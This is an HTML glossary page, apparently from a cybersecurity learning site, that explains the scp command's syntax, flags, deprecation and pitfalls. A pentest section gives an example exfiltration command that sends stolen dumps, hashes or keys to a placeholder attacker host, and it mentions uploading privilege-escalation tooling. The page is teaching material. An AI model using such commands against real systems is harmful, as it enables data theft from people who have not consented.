@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>scp — Secure Copy Over SSH ☕</title>
+<link rel="stylesheet" href="../assets/styles.css" />
+</head>
+<body data-page-slug="scp">
+
+<div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+
+<div class="topbar">
+  <a class="logo" href="../index.html">☕ CYBERSEC.VAULT</a>
+  <nav>
+    <a href="../index.html">Home</a>
+    <a href="../index.html#topics-web">Topics</a>
+    <a href="index.html" class="active">Glossary</a>
+    <a href="../tryhackme/index.html">THM</a>
+  </nav>
+  <div class="search-wrap">
+    <input type="text" class="search" placeholder="Search (press /)..." />
+    <div class="search-results"></div>
+  </div>
+</div>
+
+<div class="breadcrumb">
+  <a href="../index.html">Home</a>
+  <span class="sep">›</span>
+  <a href="index.html">Glossary</a>
+  <span class="sep">›</span>
+  <span>scp</span>
+</div>
+
+<section class="hero" style="min-height: 45vh;">
+  <div class="hero-content">
+    <span class="coffee-badge">📖 glossary · linux · encrypted file mover</span>
+    <h1 style="font-family: var(--mono);">scp <span style="color: var(--accent-2);">📤</span></h1>
+    <p class="subtitle">Secure Copy. Move files between machines over an encrypted SSH tunnel.<br>Same authentication as SSH. Same security. Different verb.</p>
+    <div class="tagline">"If SSH is a voice call, scp is you mailing them a folder." 📦</div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 01 // Definition</div>
+  <h2><span class="emoji">📖</span> What does scp do?</h2>
+  <p class="lead"><strong>scp</strong> = Secure Copy. It transfers files between two machines using the <span class="term" data-term="ssh">SSH</span> protocol for authentication and encryption. Syntax mirrors the familiar <code class="inline">cp</code> command: <em>source destination</em>.</p>
+
+  <div class="paper">
+    <h4>📝 Think of it like a private courier service</h4>
+    <p>Regular <code>cp</code> is copying a file from one folder to another on your own computer. <code>scp</code> is copying across the <em>internet</em> — but wrapped inside an SSH envelope so nobody on the wire can snoop. Same credentials you use for <code class="inline">ssh user@host</code> work for <code class="inline">scp user@host:path</code>.</p>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 02 // Syntax</div>
+  <h2><span class="emoji">🧩</span> The two directions</h2>
+
+  <div class="grid cols-2">
+    <div class="card">
+      <h4>⬆️ Push: local → remote</h4>
+      <div class="code" style="margin-top: 8px;">
+scp <span class="str">./notes.txt</span> \
+  <span class="str">ubuntu@192.168.1.30</span>:<span class="str">/home/ubuntu/</span>
+      </div>
+      <p style="font-size: 13px; color: var(--ink-dim);">Send <code class="inline">notes.txt</code> to the remote user's home folder.</p>
+    </div>
+    <div class="card">
+      <h4>⬇️ Pull: remote → local</h4>
+      <div class="code" style="margin-top: 8px;">
+scp <span class="str">ubuntu@192.168.1.30</span>:<span class="str">/etc/passwd</span> \
+  <span class="str">./passwd-remote</span>
+      </div>
+      <p style="font-size: 13px; color: var(--ink-dim);">Grab the remote <code class="inline">passwd</code> file, save locally.</p>
+    </div>
+  </div>
+
+  <h3>Useful flags</h3>
+  <ul>
+    <li><code class="inline">-r</code> — recursive (copy whole directories)</li>
+    <li><code class="inline">-P 2222</code> — non-default SSH port (NOTE the capital P — <code class="inline">ssh</code> uses lowercase p)</li>
+    <li><code class="inline">-i key.pem</code> — use this SSH private key</li>
+    <li><code class="inline">-C</code> — compress in transit (handy for big transfers over slow links)</li>
+    <li><code class="inline">-p</code> — preserve timestamps and mode (forensics-friendly)</li>
+  </ul>
+
+  <div class="callout info">
+    <strong>💡 Hot tip:</strong> Both ends of the copy can be remote. <code class="inline">scp user1@host1:/file user2@host2:/dest</code> routes through YOUR machine. Slow, but sometimes the only option if the two boxes can't talk directly.
+  </div>
+</section>
+
+<div class="divider">the security angle</div>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 03 // scp in the pentest workflow</div>
+  <h2><span class="emoji">🥷</span> Exfil, staging, and loot</h2>
+
+  <div class="callout danger">
+    <strong>🚨 Classic use cases:</strong>
+    <ul style="margin-top: 8px;">
+      <li><strong>Exfil loot.</strong> Popped a DB dump, hashes file, private keys. SSH is open to your attack box → <code class="inline">scp trophy.tar.gz attacker@YOUR_IP:/loot/</code>.</li>
+      <li><strong>Drop tooling.</strong> Upload linpeas.sh, pspy, or a static nmap binary. Inverse of wget's "pull" — here you're pushing.</li>
+      <li><strong>Backup shells you care about.</strong> Grab interesting config files before a reboot or cleanup wipes the box.</li>
+    </ul>
+  </div>
+
+  <h3>scp vs wget vs rsync</h3>
+  <div class="grid cols-3">
+    <div class="card">
+      <h4>scp</h4>
+      <p>Needs SSH creds on remote. Encrypted. Both push and pull. Simple syntax.</p>
+    </div>
+    <div class="card">
+      <h4>wget / curl</h4>
+      <p>Only pulls, via HTTP/HTTPS. Doesn't need creds if the server is open. Different protocol, different log trails.</p>
+    </div>
+    <div class="card">
+      <h4>rsync</h4>
+      <p>scp's smarter sibling. Delta-copies (only changed bytes). Can run over SSH. Handles huge trees gracefully.</p>
+    </div>
+  </div>
+
+  <div class="brain-power">
+    <div class="label">🧠 Brain Power</div>
+    <div class="question">Why is scp being deprecated in favor of <code class="inline">sftp</code> and <code class="inline">rsync</code> on modern systems?</div>
+    <button class="reveal-btn" onclick="toggleAnswer(this)">Reveal answer</button>
+    <div class="answer">
+      <p>scp's protocol is old, simple, and has had a few CVEs (like CVE-2019-6111 — a malicious server could overwrite extra files on your machine during a pull). OpenSSH 9.0+ made scp use the SFTP protocol underneath by default, but the scp command is still considered legacy. <strong>rsync and sftp</strong> are more auditable, support partial transfers better, and don't have the "trust the server completely" design flaw.</p>
+    </div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="chapter-num">Chapter 04 // Real-world gotchas</div>
+  <h2><span class="emoji">⚠️</span> Where scp bites you</h2>
+
+  <ul>
+    <li><strong>No mkdir.</strong> scp won't create missing remote directories. Target path must already exist (except the final filename).</li>
+    <li><strong>Spaces in paths.</strong> Need to quote <em>twice</em> — once for your local shell, once for the remote shell. <code class="inline">scp "local.txt" 'user@host:"/with spaces/"'</code>.</li>
+    <li><strong>SELinux / AppArmor context.</strong> Files copied with scp sometimes land with unexpected security contexts on SELinux-enforcing systems. Fix with <code class="inline">restorecon</code>.</li>
+    <li><strong>Huge files choke SSH.</strong> For anything over a few GB, switch to rsync with <code class="inline">--partial --progress</code>.</li>
+  </ul>
+
+  <div class="quiz">
+    <h4>🎯 Quick Check</h4>
+    <div class="q">You want to copy the folder <code class="inline">/var/backups/</code> from a remote server to your local <code class="inline">./bk/</code>. Which command?</div>
+    <div class="options">
+      <div class="opt" onclick="quizAnswer(this, false)">scp user@host:/var/backups/ ./bk/</div>
+      <div class="opt" onclick="quizAnswer(this, true)">scp -r user@host:/var/backups/ ./bk/</div>
+      <div class="opt" onclick="quizAnswer(this, false)">scp ./bk/ user@host:/var/backups/</div>
+      <div class="opt" onclick="quizAnswer(this, false)">cp -r user@host:/var/backups/ ./bk/</div>
+    </div>
+    <div class="feedback"></div>
+  </div>
+</section>
+
+<section class="chapter">
+  <div class="related-terms">
+    <h4>🔗 Related in the vault</h4>
+    <div class="tags">
+      <a href="ssh.html">🔐 SSH</a>
+      <a href="wget.html">⬇️ wget</a>
+      <a href="reverse-shell.html">🐚 Reverse Shell</a>
+      <a href="linux-permissions.html">🛡️ Linux Permissions</a>
+      <a href="../tryhackme/cybersec-101/linux-fundamentals-part-3.html">🐧 THM: Linux Fundamentals Pt. 3</a>
+    </div>
+  </div>
+</section>
+
+<footer class="site-foot">
+  <p class="coffee-line">Encrypted in transit. Exfiltrated with style. ☕</p>
+</footer>
+
+<script src="../assets/glossary.js"></script>
+<script src="../assets/app.js"></script>
+</body>
+</html>
